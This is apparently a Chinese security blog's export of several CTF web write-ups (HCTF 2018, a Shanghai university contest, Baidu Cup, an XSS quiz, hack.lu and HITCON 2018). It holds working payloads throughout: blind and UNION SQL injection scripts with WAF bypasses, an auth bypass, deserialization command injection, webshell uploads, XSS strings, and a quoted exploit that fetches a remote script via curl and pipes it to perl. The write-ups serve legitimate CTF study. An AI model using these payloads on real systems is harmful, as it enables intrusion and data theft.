下载了源码然后可以看到member.php有利用cookie进行登录的验证123456789101112131415161718if (isset($_COOKIE[\"islogin\"])) &#123; if ($_COOKIE[\"login_data\"]) &#123; $login_data = json_decode($_COOKIE['login_data'], true); $admin_user = $login_data['admin_user']; $udata = $DB-&gt;get_row(\"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1\"); if ($udata['username'] == '') &#123; setcookie(\"islogin\", \"\", time() - 604800); setcookie(\"login_data\", \"\", time() - 604800); &#125; $admin_pass = sha1($udata['password'] . LOGIN_KEY); if ($admin_pass == $login_data['admin_pass']) &#123; $islogin = 1; &#125; else &#123; setcookie(\"islogin\", \"\", time() - 604800); setcookie(\"login_data\", \"\", time() - 604800); &#125; &#125;&#125; 可以看到将login_data取出来然后进行json_decode，再根据admin_user的值去数据库进行选择，如果没有值，登录失败，否则将password进行sha1加密接着跟login_data的admin_pass进行比对，相等即登陆成功，这里有个关键点就是admin_pass和login_data的比对是弱类型比对，因此我们可以进行数字与字符串的弱等于进而绕过，密码用数字进行爆破最终payload1islogin=1; login_data=&#123;\"admin_user\":\"admin\", \"admin_pass\": 65&#125; 成功登了进去却没有看到flag，只能对数据库进行爆破看一下safe.php1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpfunction waf($string)&#123; $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\\#|\\s/i'; return preg_replace_callback($blacklist, function ($match) &#123; return '@' . $match[0] . '@'; &#125;, $string);&#125;function safe($string)&#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = safe($val); &#125; &#125; else &#123; $string = waf($string); &#125; return $string;&#125;foreach ($_GET as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_GET[$key] = $value;&#125;foreach ($_POST as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_POST[$key] = $value;&#125;foreach ($_COOKIE as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_COOKIE[$key] = $value;&#125;unset($cplen, $key, $value);?&gt; 可以看到，safe.php对cookie传过来的值进行了waf的过滤，然后再将过了waf的值放进cookie进行下一步操作，而waf几乎把所有函数都过滤了…….这里可以先留意一个逻辑，后台对于cookie里面的值，都是先进行了waf的过滤，然后json_decode，最后进行数据处理，因此我们可以对字符进行json编码，从而绕过waf的限制盲注脚本 123456789101112131415161718192021222324import requestsimport timeurl = \"http://kzone.2018.hctf.io/admin/login.php\"res = \"\"chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%@&amp;*()-+=,|./:;?\"for i in range(1,50): for char in chars: start_time = time.time() # '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\\#|\\s/i'; # payload = \"'\\u006fr\\u0020s\\u0075bstr(pass\\u0077ord,&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(5)\\u0023\".format(i,chr(char)) # admin BE933CBA048A9727A2D2E9E08F5ED046 # payload = \"'\\u006fr\\u0020s\\u0075bstr((select\\u0020binary\\u0020table_name\\u0020from\\u0020inf\\u006frmation_schema.talbes\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(5)\\u0023\".format(i,char) # F1444g # payload = \"'\\u006fr\\u0020s\\u0075bstr((select\\u0020binary\\u0020column_name\\u0020from\\u0020inf\\u006frmation_schema.columns\\u0020where\\u0020TABLE_NAME\\u003d'F1444g'\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(5)\\u0023\".format(i,char) # F1a9 payload = \"'\\u006fr\\u0020s\\u0075bstr((select\\u0020binary\\u0020F1a9\\u0020from\\u0020F1444g\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(5)\\u0023\".format(i,char) # hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125; headers = &#123;\"Cookie\":'islogin=1; login_Data=&#123;\\\"admin_user\\\":\\\"'+payload+'\\\",\"admin_pass\": \"0\"&#125;'&#125; result = requests.get(url,headers=headers) if time.time()-start_time &gt; 3: res += char print(res) breakprint(res) admin这题可以看到提示了在github上面有源码，https://github.com/woadsl1234/hctf_flask/将文件下下来可以看到有个1.sh说了每30秒重置一次数据库然后再去找源码可以看到route.py的login函数将传过来的username的值strlower一下，然后change里面也对username进行strlower再跟过去看一下strlower是什么东西嗯，就是一个将大写转成小写的函数，但是结合前面的函数可以看现一个漏洞，如果我们先注册一个名字为ᴬᴬᴬ的用户，然后strlower就会将它转成AAA，这个时候是跟后台的aaa不同的，因此可以注册成功，这是如果我们再进行修改密码，可以看到，change函数也有一个strlower函数，这时AAA就会被转成aaa，然后就成功地越权改了密码了因此最后的操作就是，先注册一个ᴬdmin，然后改密码再以admin的身份登录就有flag了参考：https://paper.tuisec.win/detail/a9ad1440249d95b hide and seek","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/12/HCTF2018-writeup/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2018上海市大学生信息安全竞赛web题解","date":"2018-11-05T16:00:00.000Z","path":"2018/11/06/2018上海市大学生信息安全竞赛web题解/","text":"记下知识点，当做个笔记好了 web1这题进去就提示看robots.txt，然后可以看到source.php和flag.php，访问一下source.php可以看见要以admin身份登录，于是post一个admin=1过去，发现还要本地访问，改一下x-client-ip成127.0.0.1，再post一个url=http://www.ichunqiu.com ，然后看见有一张无法解析的图片返回来，而且没有图片包同时发过来，猜测是ssrf利用，尝试一下访问file://www.ichunqiu.com/var/www/html/flag.php 然后就有flag了这里其实考到了一个parse_url解析url的一个漏洞点，当parse_url解析http://u:p@a.com:80@b.com 的时候，会匹配最后一个@后面符合格式的host，所以解析出来的host是b.com，因此可以在匹配ichunqiu的地址的同时可以访问到其他站点附上原题源码1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);include \"flag.php\";echo \"you need to login as admin!\";echo \"&lt;!-- post param 'admin' --&gt;\";if(isset($_POST['admin']))&#123; if($_POST['admin']==1)&#123; if($_SERVER['HTTP_X_CLIENT_IP'])&#123; if(isset($_POST['url']) &amp;&amp; parse_url($_POST['url'])['host']=='www.ichunqiu.com')&#123; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_POST['url']); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); $content = curl_exec($curl); curl_close($curl); $filename='download/'.rand().';img1.jpg'; file_put_contents($filename,$content); echo $_POST['url']; $img=\"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; echo $img; &#125; else&#123; echo \"you need post url: http://www.ichunqiu.com\"; &#125; &#125; else&#123; echo \"only 127.0.0.1 can get the flag!!\"; &#125; &#125;&#125;else&#123; $_POST['admin']=0;&#125; web2这题进去什么都没有，然后先扫一下后台源码什么的，发现index.php有源码泄露，将文件下下来恢复一下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(\"/[&lt;&gt;*;|?\\n ]/\",\"\",$str); $str=str_replace('flag','',$str); return $str; &#125; function echo($host)&#123; system(\"echo $host\"); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(\"echo\"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125;&#125;$first='hi';$var='var';$bbb='bbb';$ccc='ccc';$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1)&#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first===\"doller\")&#123; @parse_str($_GET['a']); if($var===\"give\")&#123; if($bbb===\"me\")&#123; if($ccc===\"flag\")&#123; echo \"&lt;br&gt;welcome!&lt;br&gt;\"; $come=@$_POST['come']; unserialize($come); &#125; &#125; else &#123;echo \"&lt;br&gt;think about it&lt;br&gt;\";&#125; &#125; else&#123; echo \"NO\"; &#125;&#125;else&#123; echo \"Can you hack me?&lt;br&gt;\";&#125; 可以看到，主要是在反序列化漏洞的利用，但是我们利用的时候会自动触发wakeup函数进行waf的检查，所以我们需要绕过他的waf，同时也看到echo函数有个system，因此可以进行命令注入序列化对象的利用12345$a = new come(\"echo\",array(\"`cat\\$&#123;IFS&#125;/flflagag`\"));$b = serialize($a);echo $b;echo \"&lt;br&gt;\";echo urlencode($b); 到了这里，就剩最后bbb、ccc那些的匹配了，注意&amp;要url编码 web3题目进去就给了源码12345678910111213141516171819202122232425262728&lt;?php//error_reporting(0);//$dir=md5(\"icq\" . $_SERVER['REMOTE_ADDR']);$dir=md5(\"icq\");$sandbox = '/var/sandbox/' . $dir;@mkdir($sandbox);@chdir($sandbox);if($_FILES['file']['name'])&#123; $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name']; if (!is_array($filename)) &#123; $filename = explode('.', $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die(\"emmmm...\"); &#125; $new_name = (string)rand(100,999).\".\".$ext; move_uploaded_file($_FILES['file']['tmp_name'],$new_name); $_ = $_POST['hehe']; if(@substr(file($_)[0],0,6)==='@&lt;?php' &amp;&amp; strpos($_,$new_name)===false)&#123; include($_); &#125; unlink($new_name);&#125;else&#123; highlight_file(__FILE__);&#125; 首先可以看到对于不是数组的filename进行了一堆严格的限制，但是没有对数组进行限制，所以我们可以考虑用数组进行绕过，要求filename的end和filename的[count-1]不能相等，所以我们考虑这样绕过123456array(2) &#123; [1]=&gt; string(1) \"abc\" [2]=&gt; string(3) \"php\"&#125; 这样的话，$ext = php，$filename[count(filename)-1] = abc，就能饶过限制了然后就是文件的上传了12$new_name = (string)rand(100,999).\".\".$ext;move_uploaded_file($_FILES['file']['tmp_name'],$new_name); 这两行导致了文件名不可控，但是我们可以通过目录穿越，传一个文件名为../../../../../../tmp/aaa.php的文件上去，就可以控制文件名了1234$_ = $_POST['hehe'];if(@substr(file($_)[0],0,6)==='@&lt;?php' &amp;&amp; strpos($_,$new_name)===false)&#123; include($_);&#125; 这两行限制了上传的文件前六位必须是@&lt;?php，而且文件名字不能包含$new_name，但是问题不大，因为我们现在已经可以任意传我们想要的内容，轻松绕过好吧，然后就能执行文件内容了最终数据包的内容123456789101112131415161718192021----------------------------1234567890Content-Disposition: form-data; name=\"hehe\"Content-Type: application/octet-stream/tmp/aaa.php----------------------------1234567890Content-Disposition: form-data; name=\"file[1]\"Content-Type: application/octet-streamabc----------------------------1234567890Content-Disposition: form-data; name=\"file[2]\"Content-Type: application/octet-stream../../../../../../tmp/aaa.php----------------------------1234567890Content-Disposition: form-data; name=\"a.php\"Content-Type: application/octet-stream@&lt;?php echo `cat /flag`;?&gt;----------------------------1234567890 web4这题进去是一个后台登录框，在select_guest处可以进行sql注入，imformation_schema.???被ban了，但是可以用information_schema . tables去绕过，select,union,from被替换成空格，然后进行回显注入就行了注出来管理员的密码拿去爆破一下就进入后台了，要求传去./flag.php，接下来就是文件上传的漏洞在数据包里面可以看到有个uploaddir和filename，所以猜测最终的文件名是uploaddir+filename，但是我们上传文件的时候会自动加上txt的后缀，所以要想办法截断，一般的%00,%0a,#,%09最后发现%02能截断……12345678910111213141516171819----------------------------1234567890Content-Disposition: form-data; name=\"action\"submit----------------------------1234567890Content-Disposition: form-data; name=\"fileField\"; filename=\"p \"Content-Type: application/octet-stream&lt;?php phpinfo();?&gt;----------------------------1234567890Content-Disposition: form-data; name=\"uploaddir\"Content-Type: application/octet-stream./flag.ph----------------------------1234567890Content-Disposition: form-data; name=\"button\"xxx----------------------------1234567890","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/06/2018上海市大学生信息安全竞赛web题解/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"百度杯 ctf 九月场","date":"2018-10-30T16:00:00.000Z","path":"2018/10/31/百度杯-ctf-九月场/","text":"发现还有这堆题没刷，刷一刷，记一下 Test这题是海洋cms的前台getshell漏洞，百度一下就能看到一堆的解释，翻一翻看见其实是利用了一个eval函数的漏洞，因为对客户端的输入过滤不严，导致可以执行任意代码，具体利用在search.php的页面可以看到，我们确实可以执行任意代码，接下来我们用菜刀连过去看下数据库的信息最后连接数据库就能看到flag了 123这题进去看到一个login.php，看下源码可以看见但是访问下user.php没有信息，猜测是源码泄露，扫一下果然看见了.swp有个文件下来，点开看到一堆人名，用burpsuite暴力跑一下密码，成功登入结果看到一个空页面，什么操作？？好的，源码看到这个鬼东西，就是文件上传漏洞了，去掉注释发个php文件，emmm，不能包含php，尝试一下php3,php4,php5,pht,phtml这些，最后发现pht可以绕过这里他会检测文件的内容，所以想写php是不可能的了，但是成功传了文件发现居然给回来一条链接view.php，提示file?猜测是读取文件，试下在后面加一个file=flag，果然触发waf了，试下重复下名字，好了，成功了 SQLI这题其实进去会发现302重定向了，然后原来的网页有个l0gin.php注入点在原来的页面，在后面加个l0gin.php就能看到真正的注入页面了，这题其实就是一般的回显的注入，只是过滤了逗号，所以要用个join去构造payload1' union select * from (select database()) from information_schema.tables ) a join (select version() ) b %23 1' union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select version() ) b %23 1' union select * from (select group_concat(distinct(table_name)) from information_schema.tables where table_schema='sqli') a join (select version() ) b %23 1' union select * from (select group_concat(distinct(column_name)) from information_schema.columns where table_name='users') a join (select version() ) b %23 1' union select * from (select flag_9c861b688330 from users) a join (select version() ) b %23 SQL这题进去可以看到提示flag在数据库里面，尝试一下在id后面加union、select等字符，发现会触发waf，尝试一下sel&lt;&gt;ect进行绕过，成功，接下来就是注入了注入很简单，普通的回显注入1234?id=1 un&lt;&gt;ion sele&lt;&gt;ct 1,database(),3#?id=1 un&lt;&gt;ion sele&lt;&gt;ct 1,group_concat(table_name),3 from information_schema.tables where table_schema='sqli'#?id=1 un&lt;&gt;ion sele&lt;&gt;ct 1,group_concat(column_name),3 from information_schema.columns where table_schema='sqli'#?id=1 un&lt;&gt;ion sele&lt;&gt;ct 1,flAg_T5ZNdrm,3 from info# 这题很奇怪，flag是拿到了，但是提交确实答案错误，喵喵喵？？？ 再见cms这道题题目很明显，就是在考cms的漏洞，首先我们先确定好是什么cms好吧，谷歌一波发现是齐博的cms，来一篇离别歌大佬的博客https://bugs.leavesongs.com/php/%E9%BD%90%E5%8D%9A%E6%95%B4%E7%AB%99-%E5%9C%B0%E6%96%B9%E9%97%A8%E6%88%B7sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/然后我们就去利用啦，首先注册个账号，然后去userinfo.php进行注入先寻找注入点12http://246ec0b9b99b49e0b389942159f82cedd0c28f2815984231.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select version()) where uid=3 %23 然后我们刷新一下个人主页，确实是有版本号回显的好了，找到注入点就能进行注入了1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select group_concat(distinct(table_schema)) from information_schema.tables) where uid=3 %23 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select group_concat(distinct(table_name)) from information_schema.tables where table_schema=database()) where uid=3 %23 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select group_concat(distinct(column_name)) from information_schema.columns where table_name = (select distinct(table_name) from information_schema.tables where table_schema = database() limit 1) ) where uid = 3 %23 到了这里，我们突然发现，数据库里居然没有flag的信息，大胆猜测，可能是/var/www/html/flag.php所以就用load_file进行注入，发现flag会被ban，那就换成十六进制1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select load_file(0x2F7661722F7777772F68746D6C2F666C61672E706870) ) where uid = 3 %23","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/31/百度杯-ctf-九月场/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"xss challenge 刷题记录","date":"2018-10-28T16:00:00.000Z","path":"2018/10/29/xss-challenge-刷题记录/","text":"很久以前学了xss，但是没有系统的刷过题，前几天看国际赛的题目有几题xss的题目，感觉还是不是很熟，干脆找个平台来做一做。这个是一个日本人写的平台，http://xss-quiz.int21h.jp/ ，边做边记下 Challenge 1emmm，会点html和js都能秒过，完全是裸题，直接在输入框输入1&lt;script&gt;alert(document.domain);&lt;/script&gt; 就能过了 Challenge 2还是水题，源码看见有个双引号，闭合一下就能进行触发了，1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; Challenge 3这题注入点不是在输入框，是在国家，改下包就行了 Challenge 4这题会对符号进行转义，闭合一下前面的，然后插入代码 Challenge 5这题限制了输入长度，可以在前端页面改一下maxlength，也可以直接抓包改，然后还是能弹的 Challenge 6这题闭合一下前面的值，加个onmouseover属性就能触发了 Challenge 7这题跟上一题差不多，过滤了&lt;&gt;，还是可以继续用onmouseover去触发，图基本一样，就不放了 Challenge 8这题提示了javascript sheme，scheme 属性设置或返回用于解释 content 属性的值的格式。在连接插入js伪链接然后弹窗 Challenge 9这题转义了&lt;&gt;”，正确的解法应该是utf-7编码，然后再去输入弹窗，但是我找不到thf-7转码工具，然后用上一题的方法也能苟过去，佛辣 Challenge 10这关可以看到，过滤了domian，但是我们可以通过重复关键词去进行绕过1\"&lt;script&gt;alert(document.domadomainin);&lt;/script&gt; Challenge 11这关对script和on开头的字符串都进行了过滤，也就是说script和onmouseover还有onclick都是不行的，所以只能用a标签去试一下1\"&gt;&lt;a href=\"javascript:alert(document.domain);\"&gt;&lt;/a&gt; 但是script是被过滤了，不过可以用一个unicode编码去进行绕过，最终payload：1\"&gt;&lt;a href=javascri&amp;#09pt:alert(document.domain)&gt;test&lt;/a&gt; Challenge 12“s/[\\x00-\\x20\\&lt;>\\”\\’]//g;”，这个过滤有丶真实，&lt;&gt;”‘，0x00到0x20之间的符号也会被过滤掉emmm，网上的wp都说1``onmouseover=alert(document.domain);&gt; 可以绕过，但是要在ie的浏览器下，肉鸡电脑没有ie，苟过去了苟过去了（逃 Challenge 13这题提示了style attribute，可以在CSS样式中利用expression去实现javascript中的onmouseover或者onmouseout事件，但是也是要ie（版本8以下）…………1aa:expression(onmouseover=function()&#123;alert(document.domain)&#125;) 还有另一种方式，利用background去修改css样式1background-color:#ff0000;background:url(\"javascript:alert(document.domain);\"); 但是也复现不了，不知道为什么…… Challenge 14提示s/(url|script|eval|expression)/xxx/ig;，可以看到script和expression都是被过滤了的，但是其实可以在中间引入注释符，然后成功绕过，利用实体字符进行编码绕过是不行的，过滤了&amp;，但是进行unicode是可以的，最后的payload其实跟上一题差不多，但是有个问题，也是要ie浏览器123aa:exp/**/ression(onmouseover=function()&#123;alert(document.domain)&#125;)aa:expre\\0ssion(onmouseover=function()&#123;alert(document.domain)&#125;)aa:expr\\0056ssion(onmouseover=function()&#123;alert(document.domain)&#125;) Challenge 15利用document.write去写入javascript，但是转义了&lt;&gt;，可以用十六进制去进行绕过，最后payload1\\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e Challenge 16这题跟上一题考点一样，但是提示看到了\\\\x会转成\\\\\\\\x，所有十六进制绕过是不行的了，尝试一下unicode编码1\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e 也可以八进制1\\\\74img src=x onerror=alert(document.domain)\\\\76 Challenge 17这题跟宽字节注入有点像，将双引号吞了，然后进行注入，但是这个有个要求，要在老ie（6以下版本）才能进行1p1=1%A7&amp;p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7 吞掉p1后面的引号就可以让p1第一个引号和p2的第一个引号闭合起来，然后后面再插入我们的代码，弹个domain，最后再把p2第二个引号闭合起来，就可以实现注入了 Challenge 18这题的操作有点骚，因为对”&lt;&gt;都进行了转义，所以我们要对他们进行处理，先看”的十六进制：00100010，&gt;的十六进制：00101110，&lt;的十六进制：00111100，然后我们将最高位全部换成1，也就是10100010、10111110、10111100，转化过来就是%A2、%BE、%BC，最后的payload就是1%A2%BE%BCscript%BEalert(document.domain);%BC/script%BE 但是这个也是有个前提，要在ie6以下才能成功 Challenge 19这题可以找到原来的漏洞https://blog.mindedsecurity.com/2010/09/twitter-domxss-wrong-fix-and-something.html但是我去实现的时候总是返回404页面，看大佬的博客看见火狐是不能返回的，要用ie8，溜了溜了，颓了颓了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/29/xss-challenge-刷题记录/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://xi4or0uji.github.io/tags/xss/"}]},{"title":"hacklu 2018 Baby PHP","date":"2018-10-26T16:00:00.000Z","path":"2018/10/27/hacklu-2018-Baby-PHP/","text":"这个比赛只有两道web题，一题代码审计，另一题神仙题？？贼少人做……….这篇博客先只讲一题，另一题用另一篇博客讲 题目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 &lt;?phprequire_once('flag.php');error_reporting(0);if(!isset($_GET['msg']))&#123; highlight_file(__FILE__); die();&#125;@$msg = $_GET['msg'];if(@file_get_contents($msg)!==\"Hello Challenge!\")&#123; die('Wow so rude!!!!1');&#125;echo \"Hello Hacker! Have a look around.\\n\";@$k1=$_GET['key1'];@$k2=$_GET['key2'];$cc = 1337;$bb = 42;if(intval($k1) !== $cc || $k1 === $cc)&#123; die(\"lol no\\n\");&#125;if(strlen($k2) == $bb)&#123; if(preg_match('/^\\d+＄/', $k2) &amp;&amp; !is_numeric($k2))&#123; if($k2 == $cc)&#123; @$cc = $_GET['cc']; &#125; &#125;&#125;list($k1,$k2) = [$k2, $k1];if(substr($cc, $bb) === sha1($cc))&#123; foreach ($_GET as $lel =&gt; $hack)&#123; $$lel = $hack; &#125;&#125;$‮b = \"2\";$a=\"‮b\";//;1=bif($$a !== $k1)&#123; die(\"lel no\\n\");&#125;// plz die nowassert_options(ASSERT_BAIL, 1);assert(\"$bb == $cc\");echo \"Good Job ;)\";// TODO// echo $flag; 这题把所有绕过都绕了就解出来了，考了很多个点，下面一个个解释 绕过file_get_contents可以看到get方法获得一个msg，然后去读名字为msg的文件，如果内容是Hello Challenge!那就能进入下一步，否则就退出程序这里可以用php://input去进行绕过，用我们写入的值作为内容，然后就能绕过了 key1源码要求获得的key1转成int型要能等于1337，又要key1与1337不能相等，这里用字符串就能绕过了key1=’1337’ key2key2的长度必须是42，而且key2满足以$结尾，同时不是数字这里可以用一个长度为42的以美元符号结尾的字符串去绕过，key2=’000000000000000000000000000000000001337＄’，这样构造一个符合规则的key2方便我们后面可以利用cc substr和sha1可以看到，这里的条件如果可以满足的话，我们就可以进行变量覆盖，也会多了可控的值这里想要两边都是true是不可能的了，只能让他两边同时为falsesubstr：这个函数只能处理字符串，如果给他一个数组的话，那就会返回nullsha1：很巧的是，这个函数也是处理数组的时候出错会返回一个null两边同时为null，恰好可以满足条件，进去下一步 $a !== $k1这里第一行的代码倒了过来，应该是 $b = “2”; $a = “b”; // ;1 = b这是一个小的trick，https://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/#rtlo-trick所以a的值其实是2，因此我们上一步进行变量覆盖的时候可以将k1赋值为2 assert_options这个考到了assert这些函数，看下官方解释，http://php.net/manual/en/function.assert-options.php这里利用assert(“$bb == $cc”);我们可以用 // 注释掉后面的 == $aa”，然后再插入函数，读出flag，也就是assert(“show_source(‘flag.php’); // == $cc”)至此，完成了整个代码的绕过了，最终payload?msg=php://input&amp;key1=1337&amp;k1=2&amp;key2=000000000000000000000000000000000001337%ef%bc%84&amp;cc[]=&amp;bb=show_source(‘flag.php’);//Hello Challenge!","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/27/hacklu-2018-Baby-PHP/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"hitcon 2018 One Line PHP Challenge","date":"2018-10-24T16:00:00.000Z","path":"2018/10/25/hitcon-2018-One-Line-PHP-Challenge/","text":"前段时间打了个神仙比赛，全程挂机，tqltql这里记录一下复现好吧题目很简单，就一行这题看过去没有什么头绪，后来看到wp才知道原来是考session的漏洞。 session的问题php检查session是否要处理是通过session.auto_start或者session_start()，但是默认情况下session.auto_start的Off的，而代码如果没有session_start()也是没有开启session的，但是如果用PHP_SESSION_UPLOAD_PROGRESS在多部分POST数据里就可以开启session了这里我建了个php文件去测试，我在html文件夹下放了一个123.php，里面什么代码都没有，然后在linux shell里面输入下面的语句123456789$ curl http://vps_ip/123.php -H 'Cookie: PHPSESSID=hhh'$ ls -a /var/lib/php/sessions. ..$ curl http://vps_ip/123.php -H 'Cookie: PHPSESSID=hhh' -d 'PHP_SESSION_UPLOAD_PROGRESS=blabalbal'$ ls -a /var/lib/php/sessions. ..$ curl http://vps_ip/123.php -H 'Cookie: PHPSESSID=hhh' -F 'PHP_SESSION_UPLOAD_PROGRESS=blabalbal' -F 'file=@/etc/passwd'$ ls -a /var/lib/php/sessions. .. sess_hhh 可以看到，确实是有一个session是hhh。 session会被清除的问题但是这里还有个问题，我们在自己的Linux上测试是可以保存了session文件的，但是hitcon可不可以保存session文件呢开发手册可以看见，cleanup默认是开启的，所以我们想将session文件保留下来，就要用到条件竞争，或者上传一个很大的文件去一直保留进度，让session一直存活。 session的利用好了，到了现在，我们可以保证session里面肯定是有一个文件是我们自己上传进去的了，现在我们来看下那个文件好的，upload_progress后面的是可控的，但是还有一个问题，我们想要去掉前面的upload_progress怎么办呢，这里就要用到base64的容错了 base64容错利用我们知道，base64只会解密[a-zA-Z0-9]，但是，如果里面有不合法的字符的时候，他还是可以把正确的字符连接在一起去进行加密的举个栗子看个代码123456789101112$i = 0 ;$data = \"upload_progress_ZZ\";while(true)&#123; $i += 1; $data = base64_decode($data); var_dump($data); echo '&lt;br&gt;'; if($data == '')&#123; echo \"解密次数: \".$i.\"\\n\"; break; &#125;&#125; 可以看见，加了两个字母以后，upload_progress在经过三次解密后就没有了，所以我们想改掉前缀只需要对信息base64加密三次传输就行了最后给个orange师傅的exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import sysimport stringimport requestsfrom base64 import b64encodefrom random import sample, randintfrom multiprocessing.dummy import Pool as ThreadPoolHOST = 'http://54.250.246.238/'sess_name = 'iamorange'headers = &#123; 'Connection': 'close', 'Cookie': 'PHPSESSID=' + sess_name&#125;payload = '@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;'while 1: junk = ''.join(sample(string.ascii_letters, randint(8, 16))) x = b64encode(payload + junk) xx = b64encode(b64encode(payload + junk)) xxx = b64encode(b64encode(b64encode(payload + junk))) if '=' not in x and '=' not in xx and '=' not in xxx: payload = xxx print payload breakdef runner1(i): data = &#123; 'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + payload + 'Z' &#125; while 1: fp = open('/etc/passwd', 'rb') r = requests.post(HOST, files=&#123;'f': fp&#125;, data=data, headers=headers) fp.close()def runner2(i): filename = '/var/lib/php/sessions/sess_' + sess_name filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename # print filename while 1: url = '%s?orange=%s' % (HOST, filename) r = requests.get(url, headers=headers) c = r.content if c and 'orange' not in c: print [c]if sys.argv[0] == '1': runner = runner1else: runner = runner2pool = ThreadPool(32)result = pool.map_async( runner, range(32) ).get(0xffff) 好了好了，总的来说这题考了条件竞争，session漏洞，base64容错机制，溜了溜了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/25/hitcon-2018-One-Line-PHP-Challenge/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"一个php的小trick：file_put_contents","date":"2018-10-22T16:00:00.000Z","path":"2018/10/23/一个php的小trick：file_put_contents/","text":"这里给个pwnhub的简化版的题123456789101112&lt;?phpfunction is_valid($title, $data)&#123; $data = $title . $data; return preg_match('|\\A[ _a-zA-Z0-9]+\\z|is', $data);&#125;$title = $_GET['title'];$data = $_GET['data'];if (!is_valid($title,$data))&#123; exit(\"no!no!no!\");&#125;file_put_contents('a.php',$data); 先解释一下代码，传过来的title和data两个值拼接在一起，然后去匹配正则表达式，只能有字母、数字、空格和下划线，如果匹配成功，就使用file_put_contents将data的内容写进去a.php文件可是我们想写一个马进去，至少也是要有?这些字符的，这里就利用到php的一个trick了 